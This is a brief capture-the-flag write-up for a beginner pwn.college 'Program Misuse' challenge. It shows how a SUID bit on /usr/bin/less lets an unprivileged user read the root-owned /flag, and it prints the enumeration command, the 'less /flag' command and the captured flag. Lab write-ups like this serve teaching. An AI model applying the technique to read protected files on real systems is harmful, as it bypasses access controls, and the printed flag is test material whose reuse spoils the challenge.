# Challenge Name: less
**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/less`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/less
```

output:
```
-rwsr-xr-x 1 root root 180064 Apr 28  2024 /usr/bin/less
```

-The `s` in `-rws` indicates it's a SUID binary.
-`less` runs with **root privileges**.

## 🚀 Exploitation

The `less` command is a terminal pager program used to view the content of files or command output, one screen at a time — but with more power than more

```bash
less /flag
```
Output:
```

pwn.college{YHYS1yu1yPZbe71ggvwBGhSde7G.dVDNxwSM0IzMyEzW}
/flag (END)
```


